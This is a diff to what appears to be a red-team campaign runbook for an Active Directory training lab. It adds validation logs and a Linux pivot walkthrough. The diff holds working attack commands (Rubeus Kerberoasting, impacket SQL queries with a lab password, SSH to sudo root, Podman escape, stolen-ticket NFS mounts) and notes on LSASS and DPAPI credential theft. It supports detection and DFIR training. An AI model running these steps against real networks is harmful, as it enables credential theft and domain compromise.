@@ -4,17 +4,19 @@
 > **Implements** `docs/internal/plan01-telemetry-catalog/phase1-source-matrix/five-stream-merge.md (local maintainers)` — the unified 100-attack pipeline.
 > **Per-attack metadata:** `[CAMPAIGNS-METADATA-v2.md](CAMPAIGNS-METADATA-v2.md)` — playbook refs, ACE#s, telemetry expectations.
 > **DFIR investigation bridge:** `[DFIR-Nexus-Pioneer-workflow.md](DFIR-Nexus-Pioneer-workflow.md)` — parallel attack + DFIR-Nexus case workflow (Phase 3.5 active).
-> **Index:** [`Runbooks/CAMPAIGNS-RUNBOOK-README.md`](Runbooks/CAMPAIGNS-RUNBOOK-README.md) · **Automation:** `docs/internal/plan01-telemetry-catalog/plan1.1-campaign-automation/` (local maintainers) · **Archive:** [`archive/CAMPAIGNS.md`](archive/CAMPAIGNS.md) (archived v3 index) · [`archive/CAMPAIGNS_v2.md`](archive/CAMPAIGNS_v2.md) (v2 monolith) · [`archive/CAMPAIGNS_v1_archived.md`](archive/CAMPAIGNS_v1_archived.md) (v1).
+> **Index:** [`Runbooks/CAMPAIGNS-RUNBOOK-README.md`](Runbooks/CAMPAIGNS-RUNBOOK-README.md) · **Automation:** [`automation/`](automation/) (graph, scope, `lab-seed-creds.example.json`) · **Attack flow:** [`CAMPAIGNv3-ATTACK-FLOW.md`](CAMPAIGNv3-ATTACK-FLOW.md). Pre-v3 monoliths and validation ledgers are maintainer-local (not in the published tree).
 
 **94 campaign attacks + 14 E exercises + 10 F supply-chain scenarios = 118 total.**
 
 **Validation batch 2 (2026-08-03):** WT011 Silver ✅ VERIFIED (real-service `c$` via impacket `-k`) · 3.5D File detonation ✅ (SYSTEM drop + active console session) · **3.5K LSASS extraction ✅** (procdump 62MB dump + Rubeus dump → analyst_cloud/MBR01$/cross-domain tickets) · 3.5G ✅ VERIFIED end-to-end (DPAPI backup key → masterkeys decrypted → Credential + Web Vault blobs on dc01 via updated SharpDPAPI build) · 3.5H/J ⚠️ (env) · WT012 ⚠️ (process validated to PAC-forge; Rubeus 2.2.0 vs Server 2025) · 3.5M 🔬 deferred (AAD Connect not deployed). **Key env findings (Server 2025, mbr01):** WMI permanent subs activate but never deliver (temp subs work; `WITHIN` rejected 0x80041017); comsvcs MiniDump → 64-76KB stubs but **procdump `-ma` → real 62MB dump**; mimikatz 2.2.0/pypykatz 0.3.15 can't parse Server 2025 LSASS (Rubeus dump works); staged Rubeus is obfuscated (community 2.2.0 build works but can't forge Server 2025 PAC); SharpDPAPI `Bad Version of provider` on key import — **RESOLVED by updated 2026-02-02 build (3.5G ✅)**. New scripts: `wt011-*`, `wt035d-*`, `wt035g-*`, `wt035h-*`, `wt035j-*`, `wt035k-*`, `wt012-*` under `04-automation/linux/windows/`.
 
+**Live revalidation (2026-08-22):** RedStrike dual attacker — Kali `.60` + ws01 WinRM as `analyst_t1` (engagement `mcp-llm-20260822T105200Z`). **vagrant is never an attack identity** (linux01 included). Spine scripts **T002 / T035A / T035 / T004 / T009 / T010 / T033** ✅ via `--prefer-script`. **Branch D OS path ✅** (Kerberoast `mssql-linux01` → SSH SSSD → sudo root + keytab read). Certipy `find` + ESC2 PKINIT TGT as `chief_command` ✅; UnPAC NT hash still `KDC_ERR_ETYPE_NOSUPP`; built-in Administrator PKINIT `KDC_ERR_KEY_EXPIRED`. **Not re-run this session:** H-01..H-06, T102 coercion capture, WT045 SSSD dump, WT047 NFS mount, WT048 Podman escape, Branch C WT035–039 exec.
+
 **Attack-flow reference (moved out for lightness):** [`CAMPAIGNv3-ATTACK-FLOW.md`](CAMPAIGNv3-ATTACK-FLOW.md)
 
 > ### Campaign run rules (operator-locked)
 >
-> 1. **Rule 1 — Direct SSH to ws01 only; provisioning is for lab configuration.** All attack runs originate from `ws01` via direct SSH. The `vagrant` account and the provisioning VM (`192.168.77.60`) are used only to configure the lab, apply/verify playbooks, and stage config-only support tasks; they are never an attack origin. The only exception is Rule 4’s H branch, where provisioning hosts the initial-access delivery assets and `ws01` is the target.
+> 1. **Rule 1 — Direct SSH to ws01 only; provisioning is for lab configuration.** All attack runs originate from `ws01` via direct SSH. The `vagrant` account and the provisioning VM (`192.168.77.60`) are used only to configure the lab, apply/verify playbooks, and stage config-only support tasks; they are never an attack origin **and `vagrant` is never a linux01 pivot**. The only exception is Rule 4’s H branch, where provisioning hosts the initial-access delivery assets and `ws01` is the target. **Linux01 OS access is `cadre.local\mssql-linux01` via SSSD** (see Branch D) — not `analyst_t1` SSH and not local `vagrant`.
 > 2. **Rule 2 — No scheduled tasks to run commands.** Scheduled tasks are persistence-only; they are never used as execution wrappers.
 > 3. **Rule 3 — Extraction/prerequisites are validated; cracking/computation/mutation is user practice.** We verify hashes, keys, blobs, and prerequisite state; password cracking or mutating steps are not completion criteria.
 > 4. **Rule 4 — H branch is the only branch where provisioning is the attacker.** For H-01..H-06, provisioning hosts the delivery assets and `ws01` is the target; we verify the delivery/drop side, while real browser clicks remain user practice.
@@ -28,7 +30,7 @@
 > | Learn + execute one phase | **Phase runbook** (e.g. [`Runbooks/CAMPAIGNS-RUNBOOK-0.md`](Runbooks/CAMPAIGNS-RUNBOOK-0.md)) |
 > | Pick which file to open | [`Runbooks/CAMPAIGNS-RUNBOOK-README.md`](Runbooks/CAMPAIGNS-RUNBOOK-README.md) |
 > | Search entire campaign / print | **This file** (`CAMPAIGNS_v3.md`) |
-> | Index + topology pointer | [`archive/CAMPAIGNS.md`](archive/CAMPAIGNS.md) (archived v2) |
+> | Index + topology pointer | [`CAMPAIGNS_v3.md`](CAMPAIGNS_v3.md) (this file) |
 > | Attack routing (ws01-primary) | [`WS01-ROUTING.md`](../04-automation/linux/lib/WS01-ROUTING.md) |
 >
 > **After each verified attack:** update [`CAMPAIGNS-METADATA-v2.md`](CAMPAIGNS-METADATA-v2.md).
@@ -3454,25 +3456,53 @@ SharpSCCM.exe get naa -s mbr02.range.local
 
 ### Branch D: Linux Pivot
 
-> **Verification note (2026-08-01):** Branch D fully verified. MSSQL linked-server pivot (entry) verified; **WT045-048 VERIFIED 2026-08-01** — SSSD (keytab recreated), keytab extraction, NFS krb5p mount, Podman escape. Config gaps fixed live + propagated to `07-linux-config.yml` (+verifyOnly) + `sql-integration-guide.md` §3.4/3.5.
+> **Verification note (2026-08-01):** WT045–048 verified after SSSD keytab + sudo misconfig + NFS GSS fixes in `07-linux-config.yml` / `sql-integration-guide.md` §3.4/3.5.  
+> **Revalidation (2026-08-22):** WT044 SQL hop ✅; **OS compromise ✅** as `cadre.local\mssql-linux01` (Kerberoast TGS from ws01 Rubeus + SSH SSSD + `sudo -n` → root + `/etc/krb5.keytab` / `mssql.keytab` readable). `analyst_t1` SSH to linux01 **fails**. Kali `nxc --kerberoasting` against this SPN is **`KDC_ERR_ETYPE_NOSUPP`** — use Rubeus on ws01. **`vagrant` is not this path.** WT045 dump / WT047 NFS mount / WT048 Podman **not re-run** 2026-08-22 (still 2026-08-01).
 
 **Diverges from:** Phase 3 (MSSQL linked-server recon discovers linux01).  
 **Converges to:** Phase 6 (domain credentials from linux01 help accelerate child DA).  
-**Plan 1.1:** First-class branch graph (M3) — missing Linux-origin / linux01 endpoint fidelity is an **acceptable** trade-off; do not add provisioning monitoring.  
-**Root on linux01 required** — two ways to achieve it.
+**Plan 1.1:** First-class branch graph (M3) — missing Linux-origin / linux01 endpoint fidelity is an **acceptable** trade-off; do not add provisioning monitoring.
+
+**How linux01 is compromised (do not skip this):** two hops, two identities.
+
+| Hop | Identity | What you get | What you do **not** get |
+|-----|----------|----------------|-------------------------|
+| **WT044** | `child\analyst_t1` → mbr01 SQL → linked `LINUX01` | Database list / optional `sa` **BULK** read of `mssql.keytab` | **No OS shell.** SQL Server Linux has no `xpstar.dll` / `xp_cmdshell`. |
+| **OS** | `cadre.local\mssql-linux01` (SPN `MSSQLSvc/linux01.cadre.local:1433`) | SSH via SSSD → **`NOPASSWD:ALL` sudo → root** (`07-linux-config.yml`) | Not `analyst_t1` SSH. Not local `vagrant`. |
+
+Root on the host is then: **(1) sudo as `mssql-linux01`** (primary, live 2026-08-22) or **(2) privileged Podman escape** (WT048 — LPE if sudo were absent). WT045/046/047 run **after** that shell.
 
 #### Entry: MSSQL Linked Server Recon (WT044)
 
-Verified live (2026-07-29). Use the single-line `-query` flag; do **not** use a multi-line `<<EOF` heredoc — `impacket-mssqlclient` treats the terminator as a stored procedure name and loops.
+Verified live (2026-07-29; **re-run 2026-08-22** via `nxc mssql` 4-part query — `master`/`tempdb`/`model`/`msdb` on LINUX01). Use the single-line `-query` flag; do **not** use a multi-line `<<EOF` heredoc — `impacket-mssqlclient` treats the terminator as a stored procedure name and loops.
 
 ```bash
 impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
   -windows-auth -query "SELECT name FROM LINUX01.master.sys.databases"
 ```
 
-For scripted automation, prefer a Python `pymssql` wrapper or the PowerShell `System.Data.SqlClient` path used in `T040-mssql-linked-server-hop-ws01.sh`.
+For scripted automation, prefer a Python `pymssql` wrapper or the PowerShell `System.Data.SqlClient` path used in `T040-mssql-linked-server-hop-ws01.sh` / `T044-mssql-linux-lateral-ws01.sh`.
 
-#### Entry: Podman Container Escape (WT048)
+#### OS entry: Kerberoast `mssql-linux01` → SSH (required for a shell)
+
+Account: `CN=mssql-linux01,OU=Cloud,DC=cadre,DC=local` — **cadre.local**, not child. Password is the AD object password from `02-ad-objects.yml` (also the Kerberoast crack target; add it to `ansible/files/cadre_passwords.txt`). Rule 3: TGS extraction is the validation; cracking is operator practice.
+
+Kali NetExec RC4 roast of this user **fails** on Server 2025 (`KDC_ERR_ETYPE_NOSUPP`). Roast from **ws01** as a `cadre.local` principal (`hunter_dfir` or DA):
+
+```text
+Rubeus.exe kerberoast /user:mssql-linux01 /creduser:cadre.local\hunter_dfir /credpassword:<hunter_dfir> /creddomain:cadre.local /domain:cadre.local /dc:dc01.cadre.local /nowrap
+```
+
+Then SSH **that** user (SSSD). `sudo -n id` must return `uid=0(root)`:
+
+```bash
+# attack identity only — never vagrant
+nxc ssh 192.168.77.40 -u mssql-linux01 -p '<mssql-linux01 AD password>' -x "id; sudo -n whoami"
+```
+
+**2026-08-22 live:** `uid=981601130(mssql-linux01)` `gid=domain users` on host `linux01`; `sudo -n` → `root`; `LINUX01$@CADRE.LOCAL` + `host/LINUX01@CADRE.LOCAL` in `/etc/krb5.keytab`; `MSSQL_KEYTAB_OK`.
+
+#### After root: Podman Container Escape (WT048)
 
 ```bash
 sudo podman exec cadre-monitor unshare -r id
@@ -3489,8 +3519,10 @@ klist -c /tmp/krb5cc_*
 #### Phase 3: NFS Kerberos Mount (WT047)
 
 ```bash
-export KRB5CCNAME=/tmp/krb5cc_stolen
-sudo mount -t nfs -o sec=krb5p localhost:/exports/secure-share /mnt/cadre-nfs
+# mount by FQDN (localhost breaks nfs/ SPN). Need TGT as mssql-linux01.
+echo '<mssql-linux01 AD password>' | kinit mssql-linux01@CADRE.LOCAL
+sudo env KRB5CCNAME="$KRB5CCNAME" mount -t nfs4 -o sec=krb5p \
+  linux01.cadre.local:/exports/secure-share /mnt/cadre-nfs
 ```
 
 #### Phase 4: MSSQL Keytab Extraction (WT046)
@@ -3558,10 +3590,9 @@ env /bin/sh                                # Shell via env
 
 **Testing notes:**
 
-- linux01 has `vagrant` user with sudo (password: `vagrant`)
-- Test each GTFOBins technique from vagrant user context
-- Document which ones require sudo vs work as regular user
-- Compare with existing Branch D techniques (MSSQL linked server, SSSD, NFS)
+- Attack identity on linux01 is **`mssql-linux01`** (SSSD, `NOPASSWD` sudo). **Do not** use `vagrant` — that account is lab config only.
+- Test GTFOBins from `mssql-linux01` (with and without `sudo -n`).
+- Compare with Branch D techniques (linked-server recon, Kerberoast+SSH, SSSD, NFS, keytab).
 
 ---
 
